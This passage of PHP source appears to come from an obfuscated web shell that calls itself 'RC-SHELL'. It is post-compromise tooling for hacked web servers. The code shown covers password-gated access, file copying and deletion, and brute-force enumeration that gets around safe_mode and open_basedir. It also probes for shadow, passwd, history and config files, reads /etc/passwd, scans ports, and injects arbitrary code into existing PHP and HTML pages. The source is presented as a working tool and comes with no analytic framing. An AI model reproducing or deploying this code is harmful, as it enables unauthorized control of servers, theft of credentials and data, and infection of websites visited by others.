.topc { background: ' . ((@isset($nogradient) && $nogradient) ? z9q("topbg1") :
        z9q("topbg2")) . '; color: ' . z9q("topcolor") .
        '; padding-bottom: 10px; vertical-align: middle; }
.nav { ' . z2y("#ffffff", "#f3f3f3") .
        ' border-bottom: 1px solid #f0f0f0; padding: 2px 0 2px 2px; width: 100%; }
.footer { width: 100%; }
.tdfooter { ' . z2y(z9q("footerbg1"), z9q("footerbg2")) .
        ' border-top: 1px solid ' . z9q("footerborder1") . '; padding: 3px; color: ' .
        z9q("footercolor") . '; text-shadow: 1px 1px 5px ' . z9q("footershadow") .
        '; font-size: 9px; font-weight: bold; vertical-align: middle; }
.headnfo { width: 100%; }
.ql { width: 100%; }
.tdql { background-color: transparent; border-top: 1px solid ' . z9q("qlbg2") .
        '; border-bottom: 3px solid #E0E0E0; }
.ql1, .ql2, .qlback { font-size: 10px; font-weight: bold; }
.ql1 { ' . z2y("#fefefe", "#E0E0E0", 1) .
        ' border: 1px solid #EFEAEF; border-bottom: 0; color: #030303; width:100%; height: 22px; text-shadow: #cccccc 2px -1px 10px; }
.ql2 { ' . z2y(z9q("qlbg1"), z9q("qlbg2"), 1) . ' color: ' . z9q("qlcolor") .
        '; border-top: 1px solid ' . z9q("qlborder") .
        '; border-left: 0; border-right: 0; border-bottom: 1px solid #EFEAEF; width:100%; height: 22px; text-shadow: ' .
        z9q("qlshadow") . ' 2px -1px 10px; }
.qlback { ' . z2y(z9q("qlbg1"), z9q("qlbg2"), 1) . ' border-top: 1px solid ' .
        z9q("qlborder") . '; border-bottom: 1px solid #EFEAEF; color: ' . z9q("qlcolor") .
        '; width:100%; text-shadow: ' . z9q("qlshadow") .
        ' 2px -1px 10px; height: 22px; cursor: pointer; }
.ql1:hover { cursor:pointer; }
.ql2:hover, .qlback:hover { color: ' . z9q("qlcolorhover") .
        '; cursor: pointer; }
.size1, .size2, .size3, .size4, .size5, .size6, .size7, .size8, .size9, .size10 {  background-color: #FFFFFF; border: 1px solid #CCCCCC; color: #333333; margin: 1px; margin-right: 0; font-size: 10px; text-shadow: 1px 1px 5px #dddddd; vertical-align: middle; }
.size1, .size2, .size3, .size5, .size6, .size7, .size8, .size9, .size10  { height: 20px;}
.size1 { width: 300px; }
.size2 { width: 65px; }
.size3 { width: 200px; }
.size4 { width: 65px; height: 18px; }
.size5 { width: 100px; }
.size6 { width: 150px; }
.size7 { width: 40px; }
.size8 { width: 99%; min-width: 370px; }
.size9 { width: 205px; }
.size10 { width: 550px; }
.list1 { background: #F2f2f2; }
.list2 { background: #F5F5F5; }
.list3 { background: #E0E0E0; }
.list1:hover, .list2:hover { background-color: #E0E0E0; }
.list3:hover { background: #CCCCCC; }
.tdlsh1, .tdlsh2, .tdph { background-color: transparent; border-top: 1px solid #DDDDDD; border-right: 1px solid #FFFFFF; border-bottom: 1px solid #CCCCCC; border-left: 1px solid #CCCCCC; color: #333333; text-shadow: 1px 1px 3px #ffffff; height: 20px; }
.tdlsh1, .tdlsh2 { padding-left: 2px; padding-right: 5px; min-width: 60px; height: 20px; }
.tdlsh1 { border-left: 0; min-width: 350px; }
.tdph { padding-left: 2px; }
.tdpl { background-color: transparent; border-left: 1px solid #dddddd; border-right: 1px solid #ffffff; padding: 2px; min-width: 40px; min-height: 20px; word-break: break-all; }
.head { background-color: transparent; border:0; min-width: 100%; color: #333333; text-shadow: 1px 1px 3px #ffffff; margin: 0; padding:0; font-size: 10px; font-weight: normal; text-align: left; }
.head:hover { cursor: pointer; }
.tdlsh1, .tdlsh2, .tdph { ' . z2y("#F5F5F5", "#E0E0E0") .
        ' height: 22px !important; }
.tdlsh1:hover, .tdlsh2:hover, .tdph:hover { ' . z2y("#fefefe", "#dddddd") . ' }
.tdlsf { padding-left: 2px; min-width: 300px; height: 20px; vertical-align: middle; }
.tdlsfn, .tdlsf1 { padding-left: 2px; padding-right: 5px; min-width: 60px; height: 20px; vertical-align: middle; }
.tdlsf1 { border-left: 1px solid #FFFFFF; min-width: 200px; }
.tdhead { ' . z2y("#E0E0E0", "#efefef", 1) .
        ' border-top: 1px solid #f3f3f3; border-bottom: 1px solid #e0e0e0; border-right:0; color: #030303; padding-left: 3px; height: 20px; font-size: 9px; font-weight: bold; }
.tdhead td, .tdlbl { color: #333333; padding: 3px; font-weight: bold; text-shadow: 1px 1px 3px #ffffff; }
.tdlbl { width: 150px; }
.tdmail { padding: 0 10px 0 10px;}
img { vertical-align: middle; }
.fimg { border: 0; padding:0; padding-right:1px; vertical-align: middle; }
.tfilter { width: 100%; }
.tdfilter { ' . z2y("#efefef", "#E0E0E0") .
        ' border-top: 1px solid #fefefe; color: #333333; padding: 2px; font-weight: bold; }
.nr, .nw, .rw { background-color: transparent; font-weight:normal; text-tecoration: none; }
.nr { color: ' . z9q('errcolor') . '; }
.nw { color: ' . z9q('normalcolor') . '; }
.rw { color: ' . z9q('okcolor') . '; }
.dirlist, .filelist { background-color: transparent; border: 0;  padding: 0; min-width: 80%; font-size: 11px; text-decoration: none; text-align: left; vertical-align: middle !important; }
.dirlist { color: ' . z9q('dircolor') . '; }
.filelist { color: ' . z9q('normalcolor') . '; }
.dirlist:hover, .filelist:hover { cursor: pointer; }
pre { background-color: #FAFAFA; color:#333333; border: 1px solid #CCCCCC; margin-top:0; padding: 5px; max-width: 1000px; max-height: 350px; text-align: left; overflow-x: auto; white-space: pre-wrap; white-space: -moz-pre-wrap !important;  white-space: -pre-wrap; white-space: -o-pre-wrap; word-wrap: break-word; }
pre code { display: block; }
.ftactive, .ftcompat, .ftother { ' . z2y("#f3f3f3", "#cccccc") .
        ' border: 1px solid #BBBBBB; margin:2px 1px 2px 0; padding: 2px 8px 2px 8px; height:20px; font-size: 10px !important; }
.ftactive:hover, .ftcompat:hover, .ftother:hover { ' . z2y("#CCCCCC", "#F3F3F3") .
        ' cursor: pointer; }
.ftactive { ' . z2y("#CCCCCC", "#F3F3F3") . ' color: #000000; }
.ftcompat { color: ' . z9q('okcolor') . '; }
.ftother { color: ' . z9q('normalcolor') . '; }
.mbut1, .mbut2 { border: 1px solid #BBBBBB; margin: 2px 1px 2px 0; padding: 1px 5px 1px 5px; height: 20px; font-size: 10px; }
.mbut1 { ' . z2y("#F3F3F3", "#CCCCCC") . ' }
.mbut2 { ' . z2y("#CCCCCC", "#F3F3F3") . ' }
.mbut1:hover, .mbut2:hover { ' . z2y("#cccccc", "#f3f3f3") .
        ' cursor: pointer; }
.iframe { background-color: #FFFFFF; border: 1px solid #CCCCCC; width: 99%;  height: 300px; vertical-align: middle; }
.console { background-color: transparent; color: #333333; border: 0; width: 100%; height: 300px; }
.tgeneric, .tedit, .txmail { border: 1px solid #cccccc; margin-top: 0; margin-bottom: 1px; width: 99%; }
.tgeneric { height: 150px; }
.tedit { height: 300px; text-align: left; }
.txmail { margin-top: 1px; width: 100%; height: 100px; }
.tsql1, .tsql2 { border: 1px solid #CCCCCC; margin-left: 1px; width: 205px; height: 60px; }
.tsql2 { width: 99% !important; }
.tinj { border: 1px solid #CCCCCC; margin: 1px; width: 300px; height: 46px; }
.tahex { width: 99%; margin-bottom:1px;}
.thex1, .thex2, .thex3 { border: 1px solid #CCCCCC; padding-top:1px; padding-left:3px; font: 13px "monospace", monospace; line-height: 20px; text-align: left; }
.thex1 { color: #000000; }
.thex2 { background-color: #FFFFFF; border-left: 0; border-right: 0; }
.thex3 { color: #000000;}
.idimg, .ifimg { ' . z0u('3') .
        ' margin-right:2px; width: 16px; height: 16px; vertical-align: middle; }
.idimg { ' . z2y(z9q('idirbg1'), z9q('idirbg2'), 1) . ' border: 1px solid ' .
        z9q('idirborder') . ';  }
.ifimg { ' . z2y(z9q('ifilebg1'), z9q('ifilebg2')) . ' border: 1px solid ' . z9q
        ('ifileborder') . '; }
.idimg:hover, .ifimg:hover { cursor: pointer; }
.selector, .divls { max-height:350px; height:350px !important; overflow: auto; }
.selector { border-top: 1px solid #FFFFFF; }
.scroll { background-color: transparent; border:0; margin:0; padding:0; max-width: 1024px; max-height:350px; overflow-y: auto; overflow-x: auto; text-align:left; }
.dwidth { width: 99%; }
.barbg { ' . z2y("#dddddd", "#ffffff") .
        ' border:1px solid #cccccc; margin-right: 5px; padding:0; width:100px; height:7px; vertical-align:middle; float:left; }
.barfil { ' . z2y("#85FF00", "#469F0B") . '; height:7px; padding:0; }
') . '
</style>
</head>
<body' . (($act == "cmd") ? ' onload="document.command.cmd.focus();"' : '') .
        '>' . (@in_array($act, array('ls', 'search', 'ftp')) ? z3b() : '') . ($act ==
        "f" && @isset($ft) && $ft == "edit" ? z1z() : '') . '
' . z7g(($login ? '1' : '0')) . z6f() . z7j();
}
function z0g($c, $s, $t)
{
    return '<input type="submit" title="' . $t .
        '" value="&nbsp;" style="border:1px solid ' . z9q("topborder1") .
        '; background: ' . $c . ';  width: ' . $s . 'px; height: ' . $s .
        'px; vertical-align: middle; vertical-align: inherit !important; cursor: pointer;">';
}
function z1x($type)
{
    return '<input type="submit" class="' . ($type == 'd' ? 'idimg' : 'ifimg') .
        '" value="&nbsp;">';
}
function z0u($i)
{
    return ' -moz-border-radius: ' . $i . 'px; -webkit-border-radius: ' . $i .
        'px; border-radius: ' . $i . 'px;';
}
function z2y($s, $e, $d = '')
{
    global $nogradient;
    if (@isset($nogradient) && $nogradient)
        return 'background: ' . (($d == '') ? $s : $e) . ';';
    return 'background: ' . (($d == '') ? $s : $e) . ';
filter: progid:DXImageTransform.Microsoft.gradient(startColorstr=\'' . $s . '\', endColorstr=\'' .
        $e . '\');
background: -webkit-gradient(linear, left top, left bottom, from(' . $s .
        '), to(' . $e . '));
background: -moz-linear-gradient(top, ' . $s . ', ' . $e . ');
background: -o-linear-gradient(top, ' . $s . ', ' . $e . ');
';
}
function z3j($login = 0)
{
    $tc = '';
    foreach (z7z(5, 'skins') as $s)
        $tc .= z5x(array('act', 'd', 'color_skin' => $s), z4y(z0g(z9q("topbg1"), "11", @
            strtoupper($s))) . " ");
    echo (!$login ? z7a(z7u(z9c('RC-SHELL v' . z7z('0') . ' : ' .
        "PAGE GENERATED IN " . (@round(z10e() - start, 4)) . " SECONDS", '4') . z6z($tc,
        '4')), '2') : '') . z7f() . z7y() . z10q() . '</body></html>';
    exit();
}
function z1a($n, $v = '', $e = 0, $p = '', $d = '', $s = false, $h = false)
{
    $_COOKIE[$n] = $v;
    return @setcookie($n, $v, $e, $p, $d, $s, $h);
}
function z1l($n)
{
    if (@isset($_COOKIE[$n]))
        unset($_COOKIE[$n]);
    return @setcookie($n, null, -1);
}
function z1h($n)
{
    return (@isset($_COOKIE[$n]) ? $_COOKIE[$n] : '');
}
function z0j()
{
    foreach (array('bcopy', 'bcut') as $t) {
        global ${$t};
        if (@count(${$t}) > 0) {
            $_SESSION[$t] = ${$t};
            $c = @serialize(${$t});
            z1a($t, $c);
        } else {
            z0i($t);
            z1l($t);
        }
    }
}
function z1d()
{
    foreach (array('bcopy', 'bcut') as $t) {
        global ${$t};
        if (@isset($_SESSION[$t])) {
            ${$t} = $_SESSION[$t];
        } elseif (($c = z1h($t)) != '') {
            ${$t} = @unserialize($c);
        } else {
            ${$t} = array();
        }
    }
}
function z0d($a = 1)
{
    foreach (array('bcopy', 'bcut') as $t) {
        global ${$t};
        if (@isset(${$t}) && $a)
            unset(${$t});
        z0i($t);
        z1l($t);
    }
}
function z1o($f, $t)
{
    global $bcopy, $bcut;
    z0d(0);
    $u = (($t == 'bcopy') ? 'bcut' : 'bcopy');
    foreach (${$u} as $k => $v) {
        if (${$u}[$k] == $f)
            unset(${$u}[$k]);
    }
    if (!@in_array($f, ${$t})) {
        ${$t}[] = $f;
    } else {
        foreach (${$t} as $k => $v) {
            if (${$t}[$k] == $f)
                unset(${$t}[$k]);
        }
    }
}
function z4g()
{
    global $color_skin;
    $l = z7z('1');
    $zu = z1h('zu');
    $zp = z1h('zp');
    if ($l['use_auth'] && z7e('md5')) {
        $s = $e = 0;
        if (@isset($_SESSION['ok']) || ($zu == $l['md5_user'] && $zp == $l['md5_pass'])) {
            $s = 1;
        } elseif (@isset($_POST['zu']) && @isset($_POST['zp'])) {
            if (@md5($_POST['zu']) == $l['md5_user'] && @md5($_POST['zp']) == $l['md5_pass']) {
                $_SESSION['ok'] = 1;
                z1a('zu', @md5($_POST['zu']));
                z1a('zp', @md5($_POST['zp']));
                $s = 1;
            } else {
                $e = 1;
            }
        }
        if (!$s) {
            $color_skin = z7z('5', 'default_skin');
            z3z(1);
            echo z9k() . z7a(z7u(z9c(z7n(z9y("1"))) . z9c(z6u('zu', ''))) . z7u(z9c(z7n(z9y
                ("2"))) . z9c(z6p('zp', ''))) . z7u(z9c('') . z9c(z8b(z9y("3"), "7")))) . z9l();
            z3j(1);
            exit();
        }
    }
}
function z0i($n)
{
    if (@isset($_SESSION[$n]))
        unset($_SESSION[$n]);
}
function z1t($n)
{
    return (@isset($_SESSION[$n]) ? $_SESSION[$n] : false);
}
function z4w()
{
    z1l('zu');
    z1l('zp');
    z0i('ok');
    if (@count($_SESSION) > 0) {
        foreach ($_SESSION as $k => $v)
            z0i($k);
    }
    @session_destroy();
}
function z7b($f)
{
    if (!z1y($f)) {
        return '0';
    } elseif (!z0n($f)) {
        return '1';
    } else
        return '2';
}
function z5g($f)
{
    $c = array("red", "white", "green");
    return $c[(z7b($f))];
}
function z6g($f)
{
    $c = array("nr", "nw", "rw");
    return $c[(z7b($f))];
}
function z7x($s)
{
    if (!@is_numeric($s))
        return '0 B';
    $m = 1024;
    $u = @explode(' ', 'B KB MB GB TB PB');
    for ($i = 0; $s > $m; $i++) {
        $s /= $m;
    }
    return @round($s, 2) . ' ' . $u[$i];
}
function z7c($i, $c = 1)
{
    foreach (z6m() as $r) {
        if (@strstr(z9b($r), $i))
            return z8w(@explode($i, z9b($r)), $c);
    }
    ;
}
function z0e($errno, $errstr, $errfile, $errline)
{
    global $safeDirArr, $c, $i;
    preg_match("#SAFE\s+MODE\s+Restriction\s+in\s+effect(.*)not\s+allowed\s+to\s+access\s+(.*)\s+owned\s+by\s+uid(.*)#",
        $errstr, $o) || preg_match("#open_basedir\s+restriction(.*)File\s*\((.*)\)\s+is\s+not#",
        $errstr, $o);
    if ($o) {
        $safeDirArr[$c] = $o[2];
        $c++;
    }
}
function z3w($dir)
{
    global $win, $safeDirArr;
    if (z7e('glob')) {
        $error_reporting = @ini_get('error_reporting');
        @error_reporting(E_WARNING);
        @ini_set("display_errors", 1);
        $root = "/";
        if ($dir)
            $root = $dir;
        $c = 0;
        $safeDirArr = array();
        @set_error_handler("z0e");
        $chars = "_-.0123456789abcdefghijklnmopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        for ($i = 0; $i < @strlen($chars); $i++) {
            $path = "{$root}" . ((@substr($root, -1) != "/") ? "/" : null) . "{$chars[$i]}";
            $prevD = $safeDirArr[@count($safeDirArr) - 1];
            @glob($path . "*");
            if ($safeDirArr[@count($safeDirArr) - 1] != $prevD) {
                for ($j = 0; $j < @strlen($chars); $j++) {
                    $path = "{$root}" . ((@substr($root, -1) != "/") ? "/" : null) . "{$chars[$i]}{$chars[$j]}";
                    $prevD2 = $safeDirArr[@count($safeDirArr) - 1];
                    @glob($path . "*");
                    if ($safeDirArr[@count($safeDirArr) - 1] != $prevD2) {
                        for ($p = 0; $p < @strlen($chars); $p++) {
                            $path = "{$root}" . ((@substr($root, -1) != "/") ? "/" : null) . "{$chars[$i]}{$chars[$j]}{$chars[$p]}";
                            $prevD3 = $safeDirarr[@count($safeDirArr) - 1];
                            @glob($path . "*");
                            if ($safeDirArr[@count($safeDirArr) - 1] != $prevD3) {
                                for ($r = 0; $r < @strlen($chars); $r++) {
                                    $path = "{$root}" . ((@substr($root, -1) != "/") ? "/" : null) . "{$chars[$i]}{$chars[$j]}{$chars[$p]}{$chars[$r]}";
                                    @glob($path . "*");
                                }
                            }
                        }
                    }
                }
            }
        }
        $safeDirArr = @array_unique($safeDirArr);
        foreach ($safeDirArr as $item)
            echo @htmlspecialchars("{$item}") . "\r\n";
        @error_reporting($error_reporting);
    }
}
function z3y($dir)
{
    if (z7e('realpath')) {
        global $win, $safeDirArr;
        $chars_rlph = "_-.0123456789abcdefghijklnmopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        $presets_rlph = array('index.php', '.htaccess', '.htpasswd', 'httpd.conf',
                'vhosts.conf', 'cfg.php', 'config.php', 'config.inc.php', 'config.default.php',
                'config.inc.php', 'shadow', 'passwd', '.bash_history', '.mysql_history',
                'master.passwd', 'user', 'admin', 'password', 'administrator', 'phpMyAdmin',
                'security', 'php.ini', 'cdrom', 'root', 'my.cnf', 'pureftpd.conf',
                'proftpd.conf', 'ftpd.conf', 'resolv.conf', 'login.conf', 'smb.conf',
                'sysctl.conf', 'syslog.conf', 'access.conf', 'accounting.log', 'home', 'htdocs',
                'access', 'auth', 'error', 'backup', 'data', 'back', 'sysconfig', 'phpbb',
                'phpbb2', 'vbulletin', 'vbullet', 'phpnuke', 'cgi-bin', 'html', 'robots.txt',
                'billing');
        if (!$dir) {
            $dir = '/etc/';
        }
        ;
        $end_rlph = '';
        $n_rlph = '3';
        $c = 0;
        $safeDirArr = array();
        $rlpArr = array();
        $error_reporting = @ini_get('error_reporting');
        @error_reporting(E_WARNING);
        @ini_set("display_errors", 1);
        @set_error_handler("z0e");
        if ($realpath = realpath($dir . '/')) {
            echo $realpath . "\r\n";
        }
        if ($end_rlph != '' && $realpath = realpath($dir . '/' . $end_rlph)) {
            echo $realpath . "\r\n";
            $rlpArr[] = $realpath;
        }
        foreach ($presets_rlph as $preset_rlph) {
            if ($realpath = realpath($dir . '/' . $preset_rlph . $end_rlph)) {
                echo $realpath . "\r\n";
                $rlpArr[] = $realpath;
            }
        }
        for ($i = 0; $i < strlen($chars_rlph); $i++) {
            if ($realpath = realpath($dir . "/{$chars_rlph[$i]}" . $end_rlph)) {
                echo $realpath . "\r\n";
                $rlpArr[] = $realpath;
            }
            if ($n_rlph <= 1) {
                continue;
            }
            ;
            for ($j = 0; $j < strlen($chars_rlph); $j++) {
                if ($realpath = realpath($dir . "/{$chars_rlph[$i]}{$chars_rlph[$j]}" . $end_rlph)) {
                    echo $realpath . "\r\n";
                    $rlpArr[] = $realpath;
                }
                if ($n_rlph <= 2) {
                    continue;
                }
                ;
                for ($x = 0; $x < strlen($chars_rlph); $x++) {
                    if ($realpath = realpath($dir . "/{$chars_rlph[$i]}{$chars_rlph[$j]}{$chars_rlph[$x]}" .
                        $end_rlph)) {
                        echo $realpath . "\r\n";
                        $rlpArr[] = $realpath;
                    }
                    if ($n_rlph <= 3) {
                        continue;
                    }
                    ;
                    for ($y = 0; $y < strlen($chars_rlph); $y++) {
                        if ($realpath = realpath($dir . "/{$chars_rlph[$i]}{$chars_rlph[$j]}{$chars_rlph[$x]}{$chars_rlph[$y]}" .
                            $end_rlph)) {
                            echo $realpath . "\r\n";
                            $rlpArr[] = $realpath;
                        }
                        if ($n_rlph <= 4) {
                            continue;
                        }
                        ;
                        for ($z = 0; $z < strlen($chars_rlph); $z++) {
                            if ($realpath = realpath($dir . "/{$chars_rlph[$i]}{$chars_rlph[$j]}{$chars_rlph[$x]}{$chars_rlph[$y]}{$chars_rlph[$z]}" .
                                $end_rlph)) {
                                echo $realpath . "\r\n";
                                $rlpArr[] = $realpath;
                            }
                            if ($n_rlph <= 5) {
                                continue;
                            }
                            ;
                            for ($w = 0; $w < strlen($chars_rlph); $w++) {
                                if ($realpath = realpath($dir . "/{$chars_rlph[$i]}{$chars_rlph[$j]}{$chars_rlph[$x]}{$chars_rlph[$y]}{$chars_rlph[$z]}{$chars_rlph[$w]}" .
                                    $end_rlph)) {
                                    echo $realpath . "\r\n";
                                    $rlpArr[] = $realpath;
                                }
                            }
                        }
                    }
                }
            }
        }
        $safeDirArr = @array_unique($safeDirArr);
        foreach ($safeDirArr as $item) {
            if (!@in_array($item, $rlpArr))
                echo @htmlspecialchars($item) . "\r\n";
        }
        @error_reporting($error_reporting);
    }
}
function z4h($d, $t, $b = 0)
{
    $d = z1j($d);
    $t = z1j($t);
    if (@is_dir($d)) {
        if (!z4r($t)) {
            @mkdir($t);
            @chmod($t, 0755);
        }
        $h = @opendir($d);
        while (($o = @readdir($h)) !== false) {
            if (($o != ".") && ($o != "..")) {
                if (@is_dir(z1k($d) . $o)) {
                    z4h(z1k($d) . $o, z1k($t) . $o, $b);
                } else {
                    @copy(z1k($d) . $o, z1k($t) . $o);
                    if ($b) {
                        @unlink(z1k($d) . $o);
                    }
                }
            }
        }
        @closedir($h);
        if ($b) {
            @rmdir($d);
        }
        return true;
    } elseif (@is_file($d)) {
        if (@is_dir($t)) {
            $t = z1k($t) . z2l($d);
        }
        if ($b) {
            if (@copy($d, $t))
                return @unlink($d);
        } else {
            return @copy($d, $t);
        }
    } else {
        return false;
    }
}
function z8r($d, $t)
{
    return z4h($d, $t);
}
function z8p($d, $t)
{
    return z4h($d, $t, 1);
}
function z8a($d)
{
    $d = z1k($d);
    $h = @opendir($d);
    while (($o = @readdir($h)) !== false) {
        if ($o != "." && $o != ".." && !z4q($o)) {
            if (!z4j($d . $o)) {
                @unlink($d . $o);
            } else {
                z8a($d . $o);
            }
        }
    }
    @closedir($h);
    @rmdir($d);
    return !z4j($d);
}
function z8s($o)
{
    $o = z1j($o);
    if (@z4j($o)) {
        return z8a($o);
    } elseif (z4e($o)) {
        return @unlink($o);
    } else {
        return false;
    }
}
function z8u()
{
    $h = (@empty($_SERVER['HTTPS']) || @strtolower($_SERVER['HTTPS']) == 'off' ? 0 :
        1);
    $u = 'http' . (($h ? 's' : '') . '://' . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF']);
    $m = (@empty($_SERVER['PATH_INFO']) ? 'QUERY_STRING' : 'PATH_INFO');
    $s = $m == 'QUERY_STRING' ? '?' : '';
    return $u . $s . (@isset($_SERVER[$m]) ? $_SERVER[$m] : '');
}
function z6n()
{
    $u = array();
    $p = z9o("/etc/passwd");
    if ($p) {
        $ll = @explode("\n", $p);
        foreach (@array_unique($ll) as $l) {
            $s = @explode(":", $l);
            if (@isset($s[0]) && @isset($s[2]) && @isset($s[3]) && @isset($s[5]) && @isset($s[6]) &&
                !@isset($u[$s[0]])) {
                $u[$s[0]] = array($s[2], $s[3], $s[5], $s[6]);
            }
        }
    } elseif (z7e('posix_getpwuid')) {
        for ($i = 0; $i < 65535; $i++) {
            $a = @posix_getpwuid($i);
            if ($a && @is_array($a)) {
                if (@isset($a['name']) && !@empty($a['name']) && !@isset($u[$a['name']])) {
                    $u[$a['name']] = array($a['uid'], $a['gid'], $a['dir'], $a['shell']);
                }
            }
        }
    }
    return $u;
}
function z8l($t = 0)
{
    $a = array();
    $p = z6n();
    if (@count($p) > 0) {
        foreach ($p as $u => $v)
            $a[] = (($t) ? array($u, $v[2]) : $u);
    }
    return $a;
}
if (!z7e('str_repeat')) {
    function str_repeat($i, $c)
    {
        $r = '';
        for ($n = 0; $n < $c; $n++)
            $r .= $i;
        return $r;
    }
}
function z9w($m, $s = 0)
{
    if (($m & 0xC000) === 0xC000) {
        $t = "s";
    } elseif (($m & 0x4000) === 0x4000) {
        $t = "d";
    } elseif (($m & 0xA000) === 0xA000) {
        $t = "l";
    } elseif (($m & 0x8000) === 0x8000) {
        $t = "-";
    } elseif (($m & 0x6000) === 0x6000) {
        $t = "b";
    } elseif (($m & 0x2000) === 0x2000) {
        $t = "c";
    } elseif (($m & 0x1000) === 0x1000) {
        $t = "p";
    } else {
        $t = "?";
    }
    $a["r"] = ($m & 00400) > 0;
    $a["w"] = ($m & 00200) > 0;
    $a["x"] = ($m & 00100) > 0;
    $b["r"] = ($m & 00040) > 0;
    $b["w"] = ($m & 00020) > 0;
    $b["x"] = ($m & 00010) > 0;
    $c["r"] = ($m & 00004) > 0;
    $c["w"] = ($m & 00002) > 0;
    $c["x"] = ($m & 00001) > 0;
    if ($s)
        return array("t" => $t, "o" => $a, "g" => $b, "w" => $c);
    $o["r"] = ($a["r"]) ? "r" : "-";
    $o["w"] = ($a["w"]) ? "w" : "-";
    $o["x"] = ($a["x"]) ? "x" : "-";
    $g["r"] = ($b["r"]) ? "r" : "-";
    $g["w"] = ($b["w"]) ? "w" : "-";
    $g["x"] = ($b["x"]) ? "x" : "-";
    $w["r"] = ($c["r"]) ? "r" : "-";
    $w["w"] = ($c["w"]) ? "w" : "-";
    $w["x"] = ($c["x"]) ? "x" : "-";
    if ($m & 0x800)
        $o["x"] = ($o["x"] == "x") ? "s" : "S";
    if ($m & 0x400)
        $g["x"] = ($g["x"] == "x") ? "s" : "S";
    if ($m & 0x200)
        $w["x"] = ($w["x"] == "x") ? "t" : "T";
    return $t . @join("", $o) . @join("", $g) . @join("", $w);
}
function z8j($i, $s, $e)
{
    $p = '';
    $k = array('80' => 'Webserver', '443' => 'OpenSSL', '3306' => 'MySQL', '5432' =>
            'PostgreSQL', );
    if (z7e('fsockopen') && z7e('stream_set_timeout')) {
        for ($n = $s; $n <= $e; $n++) {
            $c = @fsockopen($i, $n, $en, $es, 1);
            if ($c) {
                @stream_set_timeout($c, 0, 50000);
                $t = @preg_replace("/(\r|\n|[^a-z0-9_&%:;\.,\[\]\(\)\s-])/i", "", @fread($c, 100));
                $t = (@isset($k[$n]) ? $k[$n] . ' ' . $t : $t);
                if (@empty($t))
                    $t = "Open";
                $p .= "[$i]   Port $n" . ((@strlen($n) < 5) ? @str_repeat(' ', (5 - @strlen($n))) :
                    '') . "   $t\r\n";
                @fclose($c);
            }
        }
    }
    return $p;
}
function z8d($a)
{
    $b = @strtolower(@ini_get($a));
    if ($b == 'on' || $b == 'yes' || $b == 'true') {
        return 'assert.active' !== $a;
    } elseif ($b == 'stderr' || $b == 'stdout') {
        return 'display_errors' === $a;
    } else {
        return (bool)(int)$b;
    }
}
function z8o($c, $l)
{
    return (@strlen($c) > $l) ? @substr($c, 0, (@ceil($l / 2) - 2)) . "[..]" . @
        substr($c, -(@ceil($l / 2) - 2)) : $c;
}
function init_buffer()
{
    if (!@isset($_SESSION['buffer'])) {
        $_SESSION['buffer'] = array();
    }
}
function unset_buffer()
{
    if (@isset($_SESSION['buffer'])) {
        unset($_SESSION['buffer']);
    }
}
function z8i($i, $t = 0)
{
    return ($t === 0 ? z7c($i) : ($t === 1 ? @ord($i) : @chr($i)));
}
function z8y($s, $d = ',', $e = '"', $esc = '\\')
{
    $n = 0;
    $r = array();
    $ed = '%#%#%E%S%C%A%P%E%D%#%#%';
    $s = @str_replace($esc . $e, $ed, $s);
    $s = @preg_replace('/' . $e . '([^' . $e . ']+)' . $e . '(\s|\t)+' . $d . '/', $e .
        "\\1" . $e . $d, $s);
    $s = @preg_replace('/' . $e . '([^' . $e . ']+)' . $e . $d . '(\s|\t)+/', $e . "\\1" .
        $e . $d, $s);
    if (@strstr($s, $e)) {
        $a = @explode($e, $s);
        foreach ($a as $i) {
            if ($n++ % 2) {
                @array_push($r, @str_replace($ed, $e, @array_pop($r) . $i));
            } else {
                $b = @explode($d, $i);
                @array_push($r, @str_replace($ed, $e, @array_pop($r) . @array_shift($b)));
                $r = @array_merge($r, $b);
            }
        }
    }
    return $r;
}
function z5s($s, $eol = "\n", $d = ',', $e = '"', $esc = '\\')
{
    $r = array();
    if (@strstr($s, $eol)) {
        $p = @explode($eol, $s);
        foreach ($p as $l) {
            if (!@empty($l))
                $r[] = z8y($l, $d, $e, $esc);
        }
    } else {
        $r[] = z8y($s, $d, $e, $esc);
    }
    return $r;
}
function z9n()
{
    return z8e(z8i(z8c()), z8c());
}
function z8t($e)
{
    $r = z9e("PATH='/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin:/usr/local/sbin';which $e");
    return (@empty($r) ? 0 : $r);
}
function z9b($i)
{
    return @base64_decode($i);
}
function z4f(&$a, $k = "")
{
    if (@is_array($a)) {
        foreach ($a as $k => $v) {
            z4f($a["$k"]);
        }
    } else {
        $a = @stripslashes($a);
    }
}
function z3s($h, $n, $o = 0)
{
    $l = @strlen($h);
    $o = ($o > 0) ? ($l - $o) : @abs($o);
    $p = @strpos(@strrev($h), @strrev($n), $o);
    return ($p === false) ? false : ($l - $p - @strlen($n));
}
function z3v($inj, $w, $f)
{
    $c = z9o($f);
    $r = '';
    if (!$c)
        return false;
    switch ($w) {
        case 'top':
            $r = $inj . $c;
            break;
        case 'end':
            $r = $c . $inj;
            break;
        case 'php1':
            $p = @strpos($c, '<?');
            if ($p === false)
                return false;
            $r = @substr($c, 0, $p) . $inj . @substr($c, $p);
            break;
        case 'php2':
            $p = z3s($c, '?>');
            if ($p === false)
                return false;
            $p += 2;
            $r = @substr($c, 0, $p) . $inj . @substr($c, $p);
            break;
        case 'html1':
            $p = @strpos($c, '<html>');
            if ($p === false)
                return false;
            $r = @substr($c, 0, $p) . $inj . @substr($c, $p);
            break;
        case 'html2':
            $p = @strpos($c, '</html>');
            if ($p === false)
                return false;
            $r = @substr($c, 0, $p) . $inj . @substr($c, $p);
            break;
        case 'html3':
            $p = @strpos($c, '<html>');
            if ($p === false)
                return false;
            $p += 6;
            $r = @substr($c, 0, $p) . $inj . @substr($c, $p);
            break;
        case 'html4':
            $p = @strpos($c, '</html>');
            if ($p === false)
                return false;
            $p += 7;
            $r = @substr($c, 0, $p) . $inj . @substr($c, $p);
            break;
        case 'body1':
            if (!@preg_match('/<body[^>]*>/', $c, $m))
                return false;
            $p = @strpos($c, $m[0]);
            $r = @substr($c, 0, $p) . $inj . @substr($c, $p);
            break;
        case 'body2':
            $p = z3s($c, '</body>');
            if ($p === false)
                return false;
            $r = @substr($c, 0, $p) . $inj . @substr($c, $p);
            break;
        case 'body3':
